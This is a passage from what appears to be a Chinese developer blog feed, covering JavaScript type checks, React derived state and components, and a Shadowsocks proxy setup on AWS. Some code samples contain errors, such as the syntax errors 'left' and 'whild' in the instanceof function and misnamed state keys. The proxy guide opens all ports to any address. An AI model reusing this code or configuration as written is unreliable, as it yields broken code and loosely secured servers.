"[Object Object]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Symbol</span>())        <span class="comment">// "[Object Symbol]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])         <span class="comment">// "[Object Array]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;)  <span class="comment">// "[Object Function]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>)        <span class="comment">// "[Object Date]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Math</span>)            <span class="comment">// "[Object Math]"</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-constructor"><a href="#3-constructor" class="headerlink" title="3. constructor"></a>3. constructor</h3><p>constructor用于判断对象的构造函数是谁<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span>.constructor        <span class="comment">// Uncaught TypeError: Cannot read property 'constructor' of null</span></span><br><span class="line"><span class="literal">undefined</span>.constructor   <span class="comment">// Uncaught TypeError: Cannot read property 'constructor' of null</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].constructor === <span class="built_in">Array</span>     <span class="comment">// true</span></span><br><span class="line">(<span class="number">123</span>).constructor === <span class="built_in">Number</span>      <span class="comment">// true</span></span><br><span class="line"><span class="string">'123'</span>.constructor === <span class="built_in">String</span>      <span class="comment">// true</span></span><br><span class="line">(&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;).constructor === <span class="built_in">Object</span>    <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Symbol</span>().constructor === <span class="built_in">Symbol</span>   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">func.constructor === <span class="built_in">Function</span>     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">date.constructor === <span class="built_in">Date</span>         <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>()</span><br><span class="line">reg.constructor === <span class="built_in">RegExp</span>        <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="built_in">Math</span></span><br><span class="line">m.constructor === <span class="built_in">Math</span>            <span class="comment">// false,事实上没有Math这个构造函数，Math的构造函数在Object上</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-instanceof"><a href="#4-instanceof" class="headerlink" title="4. instanceof"></a>4. instanceof</h3><p>检测构造函数的<code>prototype</code>属性是否出现在对象原型链中的任何位置。使用对象必须是一个object，判断对象继承于哪个对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> programmer = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">programmer.prototype = <span class="keyword">new</span> person()</span><br><span class="line"><span class="keyword">let</span> mike = <span class="keyword">new</span> programmer()</span><br><span class="line"></span><br><span class="line">mike <span class="keyword">instanceof</span> programmer   <span class="comment">// true</span></span><br><span class="line">mide <span class="keyword">instanceof</span> person       <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><em><code>instanceof</code></em>的实现原理：只要右边变量的<code>prototype</code>在左边变量的原型链上即可。因此，<code>instanceof</code>在查找的过程中会遍历左边变量的原型链，直到找到右边变量的<code>prototype</code>，如果查找失败，返回<code>false</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_instance_of</span>(<span class="params">leftValue, rightValue</span>) </span>&#123;</span><br><span class="line">  left rightProto = rightValue.prototype;</span><br><span class="line">  leftValue = leftValue.__proto__;</span><br><span class="line"></span><br><span class="line">  whild(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (leftValue === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (leftValue === rightProto) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leftValue = leftValue.__proto__;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-常用判断"><a href="#5-常用判断" class="headerlink" title="5. 常用判断"></a>5. 常用判断</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// null</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNull</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj === <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isUndefined</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj === <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>]) === <span class="string">'[object Array]'</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://juejin.im/post/5aba32d9f265da239e4e1b6c" target="_blank" rel="noopener">JS灵巧判断7种类型的方式</a></li><li><a href="https://juejin.im/post/591647550ce4630069df1c4a" target="_blank" rel="noopener">谈谈 Object.prototype.toString</a></li><li><a href="https://juejin.im/post/5b0b9b9051882515773ae714" target="_blank" rel="noopener">浅谈 instanceof 和 typeof 的实现原理</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React 你可能不需要派生的state</title>
      <link href="/2019/07/24/getDerivedStateFromProps/"/>
      <url>/2019/07/24/getDerivedStateFromProps/</url>
      <content type="html"><![CDATA[<h3 id="1-实现需求"><a href="#1-实现需求" class="headerlink" title="1. 实现需求"></a>1. 实现需求</h3><ul><li>子组件是个弹框</li><li>父组件通过props可以控制弹框出现</li><li>弹框内有一个关闭按钮，可以令弹窗消失</li></ul><p><br></p><h3 id="2-出现Bug"><a href="#2-出现Bug" class="headerlink" title="2. 出现Bug"></a>2. 出现Bug</h3><p>使用<em><code>getDerivedStateFromProps</code></em> 让组件在props变化时更新state。但实际上只要父组件重新渲染时，这个生命周期函数就会重新调用，不管 <em><code>props</code></em> 有没有变化。因此会出现下面的bug。</p><table><thead><tr><th>操作</th><th style="text-align:center">props</th><th style="text-align:right">state</th></tr></thead><tbody><tr><td>父组件点击显示弹窗</td><td style="text-align:center">true</td><td style="text-align:right">true</td></tr><tr><td>子组件关闭弹窗后</td><td style="text-align:center">true</td><td style="text-align:right">false</td></tr><tr><td>父组件执行render函数</td><td style="text-align:center">ture</td><td style="text-align:right">true   (此时，没有点击显示弹窗，弹窗会自动弹出)</td></tr></tbody></table><p>如果父组件重新渲染，在子组件修改的所有state都会丢失。这时，<code>visible</code>不是一个单一来源的值，导致state没有正确渲染。直接将props直接复制到state是不安全的。任何数据，都应保证只有一个数据来源，而且避免直接复制它。<a href="https://codesandbox.io/s/mz2lnkjkrx" target="_blank" rel="noopener">官方示例</a></p><p><br></p><h3 id="3-解决方法"><a href="#3-解决方法" class="headerlink" title="3. 解决方法"></a>3. 解决方法</h3><h4 id="3-1-完全可受控组件"><a href="#3-1-完全可受控组件" class="headerlink" title="3.1 完全可受控组件"></a>3.1 完全可受控组件</h4><p>从组件里删除state，变量只受<code>props</code>控制，调用父组件方法修改值。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EmailInput</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">onChange</span>=<span class="string">&#123;props.onChange&#125;</span> <span class="attr">value</span>=<span class="string">&#123;props.email&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-有key的非可控组件"><a href="#3-2-有key的非可控组件" class="headerlink" title="3.2 有key的非可控组件"></a>3.2 有key的非可控组件</h4><p>让组件自己存储临时的email state，但组件可以从<code>props</code>接收初始值，但更改之后的值就与props无关。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailInput</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123; <span class="attr">email</span>: <span class="keyword">this</span>.props.defaultEmail &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; <span class="attr">email</span>: event.target.value &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.email&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p>当父组件需要改变state的值时，我们可以使用<code>key</code>这个特殊的React属性。当<code>key</code>变化时，React会创建一个新的而不是更新一个既有的组件。每次key变化，表单里的所有组件都会用新的初始值重新创建。大部分情况下，这是处理state的最好办法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;EmailInput</span><br><span class="line">  defaultEmail=&#123;<span class="keyword">this</span>.props.user.email&#125;</span><br><span class="line">  key=&#123;<span class="keyword">this</span>.props.user.id&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-getDerivedStateFromProps"><a href="#3-3-getDerivedStateFromProps" class="headerlink" title="3.3 getDerivedStateFromProps"></a>3.3 getDerivedStateFromProps</h4><p>但有时组件初始化的开销太大，一个麻烦但可行的方案是在<code>getDerivedStateFromPorps</code>观察<code>userID</code>的变化。这样可以确认state的值，是通过父组件修改的，再做对应的处理。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailInput</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    email: <span class="keyword">this</span>.props.defaultEmail,</span><br><span class="line">    prePropUserID: <span class="keyword">this</span>.props.userID</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> getDerivedStateFromProps(props, state) &#123;</span><br><span class="line">    <span class="keyword">if</span> (props.userID !== state.prevPropsUserID) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        email: props.defaultEmail,</span><br><span class="line">        prevPropsUserID: props.userID</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-ref调用子组件方法"><a href="#3-4-ref调用子组件方法" class="headerlink" title="3.4 ref调用子组件方法"></a>3.4 ref调用子组件方法</h4><p>注意，不能ref高阶组件(connect到redux的组件)</p><p><br></p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://zh-hans.reactjs.org/blog/2018/06/07/you-probably-dont-need-derived-state.html#when-to-use-derived-state" target="_blank" rel="noopener">React文档-你可能不需要使用派生state</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>科学上网</title>
      <link href="/2019/07/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>/2019/07/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      <content type="html"><![CDATA[<h4 id="1-创建实例"><a href="#1-创建实例" class="headerlink" title="1. 创建实例"></a>1. 创建实例</h4><p>登录AWS控住台，创建EC2实例，设置实例</p><ul><li>定制服务器类型: Ubuntu Server</li><li>选择实例类型： 默认免费即可</li><li>配置实例：默认</li><li>添加存储：默认</li><li>配置安全组：先配置所有流量和端口开放</li><li>生成密钥对：创建新密钥对，填写密钥对名称(如<code>ufresh2011</code>)，下载密钥对。（下载下来是 私有密钥文件 .pem文件）。连接远程服务器时，需要再密钥文件下的文件目录里操作。</li><li>创建账单警报：接受账单警报，自动监控免费套餐是否超额，将要超额会向你的邮箱发邮件。</li><li>编辑入站规则，开通22端口(ssh)和8388端口(ssserver)<br>网络与安全 -&gt; 安全组 -&gt; 操作 -&gt; 编辑入站规则<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 类型 协议 端口范围 来源</span><br><span class="line">SSH TCP 22 自定义 0.0.0.0/0</span><br><span class="line">自定义TCP规则 TCP 8388 自定义 0.0.0.0/0</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-登录服务器"><a href="#2-登录服务器" class="headerlink" title="2. 登录服务器"></a>2. 登录服务器</h4><p>定制完成后，可以远程登录，在实例上右击，点击连接<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chomd 400 xxx.pem</span><br><span class="line">ssh -i "xxx.pem" xxx.com</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-安装ss"><a href="#3-安装ss" class="headerlink" title="3. 安装ss"></a>3. 安装ss</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取root权限</span><br><span class="line">sudo -s</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 更新apt-get</span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装python包管理工具</span><br><span class="line">apt-get install python-setuptools</span><br><span class="line">apt-get install python3-pip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装shadowsock </span><br><span class="line">pip3 install shadowsocks</span><br></pre></td></tr></table></figure><p>配置shadowsocks<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/shadowsocks</span><br><span class="line">vim /etc/shadowsocks/config.json</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> config.json文件内容</span><br><span class="line">&#123;</span><br><span class="line">  "server":"0.0.0.0",</span><br><span class="line">  "server_port":8388,</span><br><span class="line">  "local_address":"127.0.0.1",</span><br><span class="line">  "local_port":1080,</span><br><span class="line">  "password":"///",</span><br><span class="line">  "timeout":300,</span><br><span class="line">  "method":"aes-256-cfb",</span><br><span class="line">  "fast_open":false,</span><br><span class="line">  "workers": 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-启动shadowsocks"><a href="#4-启动shadowsocks" class="headerlink" title="4. 启动shadowsocks"></a>4. 启动shadowsocks</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 启动</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d start </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>停止</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d stop </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 重启</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d restart</span><br></pre></td></tr></table></figure><p>启动时候会有报错</p><ul><li>升级openssl导致无法使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">INFO: loading config from /etc/shadowsocks/config.json</span><br><span class="line">2019-11-16 12:49:16 INFO     loading libcrypto from libcrypto.so.1.1</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/bin/ssserver&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    load_entry_point(&apos;shadowsocks==2.8.2&apos;, &apos;console_scripts&apos;, &apos;ssserver&apos;)()</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/server.py&quot;, line 34, in main</span><br><span class="line">    config = shell.get_config(False)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/shell.py&quot;, line 262, in get_config</span><br><span class="line">    check_config(config, is_local)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/shell.py&quot;, line 124, in check_config</span><br><span class="line">    encrypt.try_cipher(config[&apos;password&apos;], config[&apos;method&apos;])</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/encrypt.py&quot;, line 44, in try_cipher</span><br><span class="line">    Encryptor(key, method)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/encrypt.py&quot;, line 83, in __init__</span><br><span class="line">    random_string(self._method_info[1]))</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/encrypt.py&quot;, line 109, in get_cipher</span><br><span class="line">    return m[2](method, key, iv, op)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/crypto/openssl.py&quot;, line 76, in __init__</span><br><span class="line">    load_openssl()</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/crypto/openssl.py&quot;, line 52, in load_openssl</span><br><span class="line">    libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)</span><br><span class="line">  File &quot;/usr/lib/python3.6/ctypes/__init__.py&quot;, line 361, in __getattr__</span><br><span class="line">    func = self.__getitem__(name)</span><br><span class="line">  File &quot;/usr/lib/python3.6/ctypes/__init__.py&quot;, line 366, in __getitem__</span><br><span class="line">    func = self._FuncPtr((name_or_ordinal, self))</span><br></pre></td></tr></table></figure></li></ul><p>定位到/usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py文件：<br>修改<em>52，111</em>行处的EVP_CIPHER_CTX_cleanup为EVP_CIPHER_CTX_reset 重启服务</p><p><br></p><h4 id="5-电脑上安装shadowsock"><a href="#5-电脑上安装shadowsock" class="headerlink" title="5. 电脑上安装shadowsock"></a>5. 电脑上安装shadowsock</h4><p>服务器地址：查看正在运行中的实例，找到公有ip<br>服务器端口：8388<br>密码：///<br>加密: aes-2560-cfb</p><p><em>结束！</em><br><br></p><h4 id="6-原理"><a href="#6-原理" class="headerlink" title="6. 原理"></a>6. 原理</h4><p>在很久以前，访问各种网站都是简单而直接的，用户的请求发送到服务器，服务器直接将信息反馈给用户。有一天，GFW出现了，每当用户获取信息，都经过GFW，GFW将一些内容过滤掉，当用户触发GFW的过滤规则时，就会收到Connection Reset这样的响应内容，而无法接收到正常的内容，</p><p>ss利用境外服务器代理的方法绕过GFW的过滤。</p><ul><li>首先用户和境外服务器基于ssh建立起一条加密的通道</li><li>用户通过建立起的隧道进行代理，通过ssh server向真实的服务发起请求</li><li>返回内容再通过创建好的隧道返回给用户。</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.eeebe.com/article/ce37aebf65afbef8.html" target="_blank" rel="noopener">https://www.eeebe.com/article/ce37aebf65afbef8.html</a></li><li><a href="http://www.tengewang.cn/archives/226.html" target="_blank" rel="noopener">http://www.tengewang.cn/archives/226.html</a></li><li><a href="https://www.hhtjim.com/tag/shadowsocks" target="_blank" rel="noopener">https://www.hhtjim.com/tag/shadowsocks</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Class 组件 &amp; 组件传值 &amp; 生命周期</title>
      <link href="/2019/06/21/React%E7%BB%84%E4%BB%B6/"/>
      <url>/2019/06/21/React%E7%BB%84%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h3 id="1-常用组件"><a href="#1-常用组件" class="headerlink" title="1. 常用组件"></a>1. 常用组件</h3><p>组件允许你将 UI 拆分为独立可复用的代码片段，并对每个片段进行独立构思。组件，从概念上类似于 Javascript 函数。它接受任意的入参(props)，并返回用于描述页面展示内容的 React 元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOM标签</span></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义组件</span></span><br><span class="line"><span class="keyword">const</span> element1 = <span class="xml"><span class="tag">&lt;<span class="name">Welcome</span> <span class="attr">name</span>=<span class="string">"Sara"</span>&gt;</span><span class="tag">&lt;/<span class="name">Welocme</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// class组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello, &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数组件: 定义组件最简单的方式就是编写javascript函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Welcome name=<span class="string">"Sara"</span> /&gt;</span><br><span class="line">      &lt;Welcome name=<span class="string">"Cahal"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-1-条件渲染"><a href="#1-1-条件渲染" class="headerlink" title="1.1 条件渲染"></a>1.1 条件渲染</h4><ul><li>与运算符 &amp;&amp;</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mailbox</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> unreadMessage = props.unreadMessage;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;unreadMessage.length &gt; <span class="number">0</span> &amp;&amp; (</span><br><span class="line">        &lt;h2&gt;you have &#123;unreadMessage.length&#125; unread message.&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">      )&#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>三目运算符</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">const</span> isLoggedIn = <span class="keyword">this</span>.state.isLoggedIn;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;isLoggedIn ? (</span><br><span class="line">        &lt;LogoutBtn /&gt;</span><br><span class="line">      ) : (</span><br><span class="line">        &lt;LoginBtn /&gt;</span><br><span class="line">      )&#125;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-列表渲染"><a href="#1-2-列表渲染" class="headerlink" title="1.2 列表渲染"></a>1.2 列表渲染</h4><p><em><code>Array.map</code></em>实现列表渲染，key 帮助 React 识别哪些元素改变了，比如被添加或删除。数组元素中使用的 key 在其兄弟节点之间应该是独一无二的。然而，它们不需要是全局唯一的，当我们生成两个不同的数组时，我们可以使用相同的 key。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 